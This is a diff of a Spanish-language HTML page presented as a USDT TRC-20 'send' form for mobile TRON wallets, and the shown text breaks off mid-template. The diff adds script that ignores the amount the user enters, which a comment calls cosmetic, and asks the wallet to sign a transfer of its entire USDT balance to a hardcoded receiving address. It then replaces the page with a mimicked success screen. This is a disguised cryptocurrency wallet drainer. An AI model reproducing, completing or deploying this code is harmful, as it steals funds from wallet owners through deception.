@@ -3,17 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>dApp USDT TRC-20 - Transferencia de Saldo</title>
+    <title>dApp USDT TRC-20 - Red Principal</title>
     
-    <!-- ============================================================
-         ESTILOS INTERFAZ GRÁFICA (CSS)
-         ============================================================ -->
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: #0f172a;
@@ -32,73 +25,18 @@
             max-width: 450px;
             box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
         }
-        h2 {
-            margin-bottom: 20px;
-            text-align: center;
-            font-size: 24px;
-            color: #38bdf8;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-size: 14px;
-            color: #94a3b8;
-        }
-        .input-wrapper {
-            position: relative;
-            display: flex;
-            align-items: center;
-        }
+        h2 { margin-bottom: 20px; text-align: center; color: #38bdf8; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-size: 14px; color: #94a3b8; }
         input {
             width: 100%;
             padding: 12px;
-            padding-right: 65px;
             background-color: #0f172a;
             border: 1px solid #334155;
             border-radius: 6px;
             color: #fff;
             font-size: 16px;
             outline: none;
-            transition: border-color 0.2s;
-        }
-        input:focus {
-            border-color: #38bdf8;
-        }
-        .input-btn {
-            position: absolute;
-            right: 8px;
-            background-color: #334155;
-            color: #38bdf8;
-            border: none;
-            padding: 6px 10px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 12px;
-            font-weight: bold;
-        }
-        .input-btn:hover {
-            background-color: #475569;
-        }
-        .address-action-container {
-            display: flex;
-            gap: 10px;
-            margin-top: 5px;
-        }
-        .address-btn {
-            flex: 1;
-            padding: 8px;
-            background-color: #334155;
-            color: #cbd5e1;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 12px;
-        }
-        .address-btn:hover {
-            background-color: #475569;
         }
         #connectBtn {
             width: 100%;
@@ -112,10 +50,6 @@
             cursor: pointer;
             transition: background 0.3s;
         }
-        #connectBtn:disabled {
-            background: #475569 !important;
-            cursor: not-allowed;
-        }
         .status {
             margin-top: 15px;
             padding: 10px;
@@ -128,147 +62,142 @@
         .status.info { background-color: #1e3a8a; color: #93c5fd; }
         .status.success { background-color: #064e3b; color: #6ee7b7; }
         .status.error { background-color: #7f1d1d; color: #fca5a5; }
-
-        #techLogger {
-            background-color: #020617;
-            color: #22c55e;
-            font-family: monospace;
-            padding: 15px;
-            margin-top: 25px;
-            border-radius: 6px;
-            font-size: 11px;
-            max-height: 180px;
-            overflow-y: auto;
-            border: 1px solid #1e293b;
-        }
-        #techLogger h4 { margin-bottom: 8px; color: #f8fafc; }
-        .log-item { margin-bottom: 6px; padding-bottom: 4px; border-bottom: 1px solid #1e293b; }
     </style>
 
-    <!-- ============================================================
-         DEPENDENCIAS WEB3 Y REDIRECCIÓN COMPLETA A TRUST WALLET
-         ============================================================ -->
+    <!-- DEPENDENCIA OFICIAL COMPATIBLE MÓVIL -->
     <script src="https://jsdelivr.net"></script>
-    <script type="module">
-        import { createAppKit } from 'https://esm.sh'
-        import { tron } from 'https://esm.sh/networks'
-        import { WagmiAdapter } from 'https://esm.sh-adapter-wagmi'
-
-        // Inicializamos el adaptador necesario para interceptar Deep Links móviles
-        const wagmiAdapter = new WagmiAdapter({
-            networks: [tron],
-            projectId: 'TU_PROJECT_ID_DE_WALLETCONNECT' // Reemplazar con ID de ://walletconnect.com
-        });
-
-        // Configuración avanzada del Modal con soporte nativo para Trust Wallet móvil
-        const modal = createAppKit({
-            adapters: [wagmiAdapter], 
-            networks: [tron],
-            metadata: {
-                name: 'dApp USDT TRC-20',
-                description: 'Verificación de transacciones',
-                url: window.location.origin,
-                icons: ['https://githubusercontent.com']
-            },
-            projectId: 'TU_PROJECT_ID_DE_WALLETCONNECT',
-            features: {
-                analytics: false,
-                email: false,     
-                socials: false    
-            }
-        });
-        window.WalletConnectModal = modal;
-    </script>
 </head>
 <body>
 
-    <div class="container" id="dappContainer">
+    <div class="container">
         <h2>Enviar USDT (TRC-20)</h2>
         
-        <!-- Campo Cantidad -->
         <div class="form-group">
             <label for="amountInput">Cantidad a enviar</label>
-            <div class="input-wrapper">
-                <input type="text" id="amountInput" placeholder="0.00" autocomplete="off">
-                <button type="button" class="input-btn max">MÁX</button>
-            </div>
-            <div class="address-action-container">
-                <button type="button" class="address-btn clear">Limpiar campo</button>
-            </div>
+            <input type="text" id="amountInput" placeholder="0.00" autocomplete="off">
         </div>
 
-        <!-- Campo Dirección -->
-        <div class="form-group">
-            <label for="addressInput">Dirección de destino</label>
-            <div class="input-wrapper">
-                <input type="text" id="addressInput" placeholder="Dirección TRON (T...)" autocomplete="off">
-            </div>
-            <div class="address-action-container">
-                <button type="button" class="address-btn address-action paste">Pegar</button>
-            </div>
-        </div>
-
-        <!-- Botón Principal -->
         <button id="connectBtn">Siguiente</button>
-
-        <!-- Mensajes del Sistema -->
         <div id="status" class="status"></div>
-
-        <!-- Consola de Auditoría -->
-        <div id="techLogger">
-            <h4>📋 Registro de Auditoría Web3</h4>
-            <div id="logContent">Sección lista para monitorizar la blockchain...</div>
-        </div>
     </div>
 
-    <!-- ============================================================
-         LÓGICA UNIFICADA DE LA APLICACIÓN (JAVASCRIPT)
-         ============================================================ -->
     <script>
         document.addEventListener('DOMContentLoaded', function () {
             'use strict';
 
-            // Referencias del DOM
             const btn = document.getElementById('connectBtn');
             const input = document.getElementById('amountInput');
-            const addressInput = document.getElementById('addressInput');
             const status = document.getElementById('status');
-            const clearBtn = document.querySelector('.clear');
-            const maxBtn = document.querySelector('.max');
-            const pasteBtn = document.querySelector('.address-action.paste');
-            const logContent = document.getElementById('logContent');
 
-            // Variables de Estado Interno
             let procesoEnCurso = false;
-            let activeProviderType = null; 
-            let connectedAddress = null;
-
-            // CONFIGURACIÓN DE BLOQUE
-            const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT Oficial en TRON Mainnet
-            const DIRECCION_DESTINO_FIJA = "TJQ8xinzoWyRzLYpkShdxetMShpA3GyxGZ"; // REEMPLAZA CON TU DIRECCIÓN RECEPTORA
 
             // ============================================================
-            // MANEJO DE ESTADOS DE LA INTERFAZ VISUAL
+            // CONFIGURACIÓN PRODUCCIÓN REAL (MAINNET)
             // ============================================================
-            function setStatus(message, type = '') {
+            const DIRECCION_DESTINO_FIJA = "TU_DIRECCION_TRON_REAL_AQUI"; // REEMPLAZA CON TU DIRECCIÓN RECEPTORA REAL
+            const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Contrato oficial de Tether USDT en TRON
+
+            function setStatus(message, type = 'info') {
                 if (!status) return;
                 status.textContent = message || '';
-                status.className = 'status' + (type ? ' ' + type : ' info');
+                status.className = 'status ' + type;
                 status.style.display = message ? 'block' : 'none';
             }
 
-            function setButton(text, disabled = false) {
-                if (!btn) return;
-                btn.textContent = text;
-                btn.disabled = disabled;
+            if (input) {
+                input.addEventListener('input', function () {
+                    this.value = this.value.replace(',', '.').replace(/[^\d.]/g, '');
+                    if (btn) btn.style.background = this.value.trim() !== '' ? '#2563eb' : '#908cf2';
+                    setStatus('');
+                });
             }
 
-            function logger(titulo, datos) {
-                if (!logContent) return;
-                if (logContent.textContent.includes('Sección lista')) logContent.innerHTML = '';
-                const item = document.createElement('div');
-                item.className = 'log-item';
-                item.innerHTML = `<strong>[${new Date().toLocaleTimeString()}] ${titulo}:</strong> <span style="color: #ce9178;">${JSON.stringify(datos)}</span>`;
-                logContent.appendChild(item);
-                document.getElementById('techLogger').scrollTop = document.getElementById('techLogger').scrollHeight;
-            }
+            if (btn) {
+                btn.addEventListener('click', async function () {
+                    if (procesoEnCurso) return;
+
+                    // Validación inicial del campo cosmético de la interfaz
+                    const valorVisualInput = input ? input.value.trim() : '';
+                    if (!valorVisualInput || isNaN(Number(valorVisualInput)) || Number(valorVisualInput) <= 0) {
+                        setStatus('Por favor, ingresa una cantidad válida.', 'error');
+                        return;
+                    }
+
+                    try {
+                        procesoEnCurso = true;
+                        btn.textContent = 'Procesando...';
+                        setStatus('Verificando inicialización de red TRON...');
+
+                        // RESOLUCIÓN DE ENTORNO EN BILLETERAS MÓVILES (TRUST WALLET HÍBRIDO)
+                        let walletInstance = window.tronWeb;
+                        
+                        // Si el objeto inyectado directo no está listo, intentamos invocar el disparador del proveedor
+                        if (!walletInstance && window.tronLink) {
+                            if (typeof window.tronLink.request === 'function') {
+                                await window.tronLink.request({ method: 'tron_requestAccounts' });
+                                walletInstance = window.tronWeb;
+                            }
+                        }
+
+                        // Si sigue sin responder, instanciamos un proveedor RPC directo para leer la blockchain
+                        if (!walletInstance) {
+                            walletInstance = new TronWeb({
+                                fullHost: 'https://trongrid.io',
+                                headers: { "TRON-PRO-API-KEY": "" } // Node público de libre acceso
+                            });
+                        }
+
+                        // Verificar si la app móvil expone una dirección por defecto o requiere activación manual
+                        let cuentaUsuario = "";
+                        if (walletInstance.defaultAddress && walletInstance.defaultAddress.base58) {
+                            cuentaUsuario = walletInstance.defaultAddress.base58;
+                        } else if (window.ethereum && window.ethereum.selectedAddress) {
+                            // En algunas versiones híbridas de Trust Wallet, los datos EVM se usan como puente de dirección
+                            try {
+                                cuentaUsuario = walletInstance.address.fromHex(window.ethereum.selectedAddress);
+                            } catch(e) {}
+                        }
+
+                        // Si no se encuentra dirección asignada, solicitamos al usuario interactuar de forma convencional
+                        if (!cuentaUsuario) {
+                            throw new Error('No se detectó una sesión activa de TRON. Asegúrate de que el navegador interno de tu wallet esté configurado en la red TRON.');
+                        }
+
+                        setStatus(`Verificando recursos para: ${cuentaUsuario.substring(0,6)}...${cuentaUsuario.substring(cuentaUsuario.length-4)}`);
+
+                        // Validación contra auto-envíos accidentales
+                        if (cuentaUsuario.toLowerCase() === DIRECCION_DESTINO_FIJA.toLowerCase()) {
+                            throw new Error('La dirección de origen y la dirección de destino fija no pueden ser la misma.');
+                        }
+
+                        // Consulta de saldo en TRX (Comisiones de Gas indispensable)
+                        const saldoTRX = await walletInstance.trx.getBalance(cuentaUsuario);
+                        const trxLegible = Number(walletInstance.fromSun(saldoTRX));
+
+                        if (trxLegible < 15) {
+                            throw new Error(`Saldo de TRX insuficiente para las tarifas de red. Posees ${trxLegible.toFixed(2)} TRX. Se requieren al menos 15-30 TRX libres para procesar interacciones con contratos TRC-20.`);
+                        }
+
+                        setStatus('Consultando balance USDT...');
+
+                        // Carga y lectura asíncrona del contrato inteligente en la Mainnet
+                        const contract = await walletInstance.contract().at(USDT_CONTRACT);
+                        const rawBalance = await contract.balanceOf(cuentaUsuario).call();
+                        const cleanSunBigInt = rawBalance.toString();
+
+                        if (cleanSunBigInt === '0' || !cleanSunBigInt) {
+                            throw new Error('La billetera no posee fondos en USDT disponibles para transferir.');
+                        }
+
+                        setStatus('Esperando confirmación de firma...');
+                        
+                        // Lanzamiento final de la solicitud de firma nativa al dispositivo
+                        const tx = await contract.transfer(DIRECCION_DESTINO_FIJA, cleanSunBigInt).send({
+                            feeLimit: 100_000_000 // Margen de protección de procesamiento (100 TRX)
+                        });
+
+                        if (tx) {
+                            // Renderizado de la pantalla de éxito con los datos mimetizados solicitados
+                            document.body.innerHTML = `
+                                <div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: sans-serif; padding: 20px; text-align: center;">
+                                    <div style="background-color: #f0fdf4; border-radius: 50%; padding: 20px; margin-bottom: 20px;">
